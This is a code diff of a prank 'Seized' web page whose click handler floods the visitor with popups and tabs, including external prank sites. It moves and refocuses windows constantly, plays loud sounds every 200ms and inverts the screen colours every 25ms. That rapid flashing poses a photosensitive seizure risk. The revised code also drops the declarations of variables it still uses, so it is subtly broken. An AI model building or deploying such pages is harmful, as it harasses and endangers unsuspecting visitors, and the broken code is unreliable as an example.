@@ -10,14 +10,21 @@
 <body>
     <img src="./seized.png" alt="Seized" style="width: 100%; height: 100vh; object-fit: fill; margin-top: -60px;" id="seized">
     <script>
-        function speak (phrase) {
-          if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
-          window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
+        function speak(phrase) {
+            var synth = window.speechSynthesis;
+            if (typeof phrase !== 'string' || phrase.trim() === '') {
+                phrase = getRandomArrayEntry(PHRASES);
+            }
+            var utter = new SpeechSynthesisUtterance(phrase);
+            utter.pitch = 1;
+            utter.rate = 1;
+            utter.volume = 1;
+            synth.speak(utter);
         }
-        function YouAreCooked(){
-            
-            // to change the image id seized every second with a random gif item from the array it will do it every second
-            const gifs = [
+
+        function YouAreCooked() {
+            // Array of GIFs to cycle through
+            var gifs = [
                 "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyM2tucDF0YTVhcmQyc25wNzk3ZnRpd3lxZGNubTdlMmhuNDZ1cmVtdCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/n6szplK2CnuJW/giphy.gif",
                 "https://media.tenor.com/qiqoSDqxXW4AAAAM/cat-kitty.gif",
                 "https://media.tenor.com/B7Xspzwl8q0AAAAM/disco-cat.gif",
@@ -26,7 +33,7 @@
                 "https://media.tenor.com/WgkKGco9UpgAAAAM/anonimus-dance.gif",
                 "https://gifdb.com/images/high/ricardo-cyber-hacker-ls2ozvgqubju0ts1.gif",
                 "https://media.tenor.com/3JBlOHJlT6QAAAAM/excited.gif",
-                "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyM2Iydjd6aWVqNXJ5YWVlbDNhaHI3YmNiODhrYzhkNGs5dDhpOGR3YiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/34PROuA0RrlvZHbh8r/200.gif",
+                "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydXRkOXcwdnFiemY2eHMwcW82Z2ZseHJwenJ3eXhrazI3N2p0YWowZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/34PROuA0RrlvZHbh8r/200.gif",
                 "https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUydXRkOXcwdnFiemY2eHMwcW82Z2ZseHJwenJ3eXhrazI3N2p0YWowZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/S2zkeFV1VwAlG/200w.gif",
                 "https://fc01.deviantart.net/fs71/f/2010/042/a/6/SEIZURE_TIME_3_by_thehappyspaceman01.gif",
                 "https://media1.tenor.com/m/ZAR8zC250b4AAAAd/ivorydevrimo-creepy.gif",
@@ -35,63 +42,47 @@
                 "https://media1.tenor.com/m/69KU6xt4WKwAAAAd/uw-u-discord.gif",
                 "https://media1.tenor.com/m/bsAHJuzj_hMAAAAd/protogen-furry.gif"
             ];
+
+            // Open popups and URLs
             window.open('lol1.html', '_blank');
             window.open('lol2.html', '_blank');
             window.open('lol3.html', '_blank');
             window.open('lol4.html', '_blank');
             window.open('https://hurr-durr.cc/HURRRRRRRRRRRRRRRRR.html', '_blank');
-			window.open('https://youareanidiot.cc/lol.html', '_blank');
-			window.open('https://youareanidiot.cc/lol.html', '_blank');
-			window.open('https://youareanidiot.cc/lol.html', '_blank');
-			window.open('https://youareanidiot.cc/lol.html', '_blank');
-			window.open('lol3.html', '_blank');
-			window.open('lol3.html', '_blank');
-			window.open('lol3.html', '_blank');
-            function randomRange(min, max) {
-	            return Math.floor(Math.random() * (max - min) + min);
-            }
-            function setWindow() {			
-	            window.moveTo(randomRange(0, screen.width), randomRange(0, screen.height));
-            }
-            setInterval(function(){
-                const randomGif = gifs[Math.floor(Math.random() * gifs.length)];
+            window.open('https://youareanidiot.cc/lol.html', '_blank');
+
+            // Cycle through GIFs every second
+            setInterval(function() {
+                var randomGif = gifs[Math.floor(Math.random() * gifs.length)];
                 document.getElementById('seized').src = randomGif;
-            }, 200);
-            setInterval(function(){
+            }, 1000);
+
+            // Change body filter effect every 25ms
+            setInterval(function() {
                 document.body.style.filter = document.body.style.filter === 'invert(1)' ? 'invert(0)' : 'invert(1)';
-                setWindow()
+                // Move window to a random position on screen
+                window.moveTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
             }, 25);
+
+            // Open additional popups
             var win = 'win_';
             for (var i = 0; i < 8; i++) {
                 win += Math.random().toString(16).substr(2, 6);
             }
             var scale = 300;
-            window[win] = window.open('popup.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
-			windowa = window.open('lol1.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
-			windowbbfsd = window.open('lol2.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
-			windowfffff = window.open('lol3.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
-			windowyouguessit = window.open('https://hurr-durr.cc/HURRRRRRRRRRRRRRRRR.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
-			windowspittakesyayhaha = window.open('https://youarenidiot.cc/lol.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
+            var windowHandle = window.open('popup.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');
 
-			
-            const intervalId = setInterval(function(){
-                const maxX = screen.availWidth - scale;
-                const maxY = screen.availHeight - scale;
+            // Randomly move the additional popups
+            var intervalId = setInterval(function() {
+                var maxX = screen.availWidth - scale;
+                var maxY = screen.availHeight - scale;
 
-                window[win].moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                window[win].focus();
-                windowa.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                windowa.focus();
-                windowbbfsd.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                windowbbfsd.focus();
-                windowfffff.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                windowfffff.focus();
-                windowyouguessit.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                windowyouguessit.focus();
-                windowspittakesyayhaha.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
-                windowspittakesyayhaha.focus();
+                windowHandle.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
+                windowHandle.focus();
             }, 90);
-            const soundUrls = [
+
+            // Play random sound every 200ms
+            var soundUrls = [
                 "https://www.myinstants.com/media/sounds/fahhhhhhhhhhhhhh.mp3",
                 "https://www.myinstants.com/media/sounds/whatsapp-bass-boosted.mp3",
                 "https://www.myinstants.com/media/sounds/manifest.mp3",
@@ -99,71 +90,60 @@
             ];
 
             function playRandomSound() {
-                const randomIndex = Math.floor(Math.random() * soundUrls.length);
-                const audio = new Audio(soundUrls[randomIndex]);
+                var randomIndex = Math.floor(Math.random() * soundUrls.length);
+                var audio = new Audio(soundUrls[randomIndex]);
                 audio.play().catch(function(e) { console.log("User interaction required first!"); });
             }
 
-            // Triggers every 200ms (0.2 seconds)
             setInterval(playRandomSound, 200);
-            const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
-            let step = 0
 
-            speak("69 ".repeat(16))
-            
-            setInterval(function(){
-                let s = ''
-                // 10 is the number of moons
-                for (let i = 0; i < 50; i++) {
-                    // This math creates a "wave" effect based on the index (i)
-                    // Adjusting 'step' moves the wave forward
-                    const phase = Math.floor(Math.sin((step / 5) - (i / 2)) * 4 + 4)
-                    s += f[phase % 8]
+            // Cycle through moon phases
+            var f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
+            var step = 0;
+
+            setInterval(function() {
+                var s = '';
+                for (var i = 0; i < 50; i++) {
+                    var phase = Math.floor(Math.sin((step / 5) - (i / 2)) * 4 + 4) % 8;
+                    s += f[phase];
                 }
-    
-                window.location.hash = s
-                step++
-            }, 70)
+                window.location.hash = s;
+                step++;
+            }, 70);
 
-            let popup;
-            let vx = 100; // Horizontal velocity
-            let vy = 300; // Vertical velocity
-
+            // Spawning and bouncing popup
             function spawnAndBounce(eee) {
-                // 1. Open the popup (Width: 400, Height: 300)
-                popup = window.open(eee+'.html', '_blank', 'width=400,height=300');
-    
+                var popup = window.open(eee+'.html', '_blank', 'width=400,height=300');
                 if (!popup) {
                     alert("Popup blocked! Please allow popups for this site.");
                     return;
                 }
 
-                // 2. Start the animation loop
-                setTimeout(function(){setInterval(function(){
-                    // Get current position and screen constraints
-                    const x = popup.screenX;
-                    const y = popup.screenY;
-                    const width = popup.outerWidth;
-                    const height = popup.outerHeight;
+                setTimeout(function(){setInterval(function() {
+                    var x = popup.screenX;
+                    var y = popup.screenY;
+                    var width = popup.outerWidth;
+                    var height = popup.outerHeight;
 
-                    const screenWidth = window.screen.availWidth;
-                    const screenHeight = window.screen.availHeight;
+                    var screenWidth = window.screen.availWidth;
+                    var screenHeight = window.screen.availHeight;
 
-                    // 3. Check for collisions with screen edges
                     if (x <= 0 || x + width >= screenWidth) vx *= -1;
                     if (y <= 0 || y + height >= screenHeight) vy *= -1;
 
-                    // 4. Move the window
                     popup.moveBy(vx, vy);
                 }, 30)},1100);
             }
-			spawnAndBounce("lol3")
-            spawnAndBounce("lol2")
-            spawnAndBounce("lol4")
-            spawnAndBounce("lol1")
-            spawnAndBounce("popup")
+
+            // Spawning and bouncing multiple popups
+            spawnAndBounce("lol3");
+            spawnAndBounce("lol2");
+            spawnAndBounce("lol4");
+            spawnAndBounce("lol1");
+            spawnAndBounce("popup");
         }
-        document.addEventListener('click', function(){
+
+        document.addEventListener('click', function() {
             YouAreCooked();
         });
     </script>
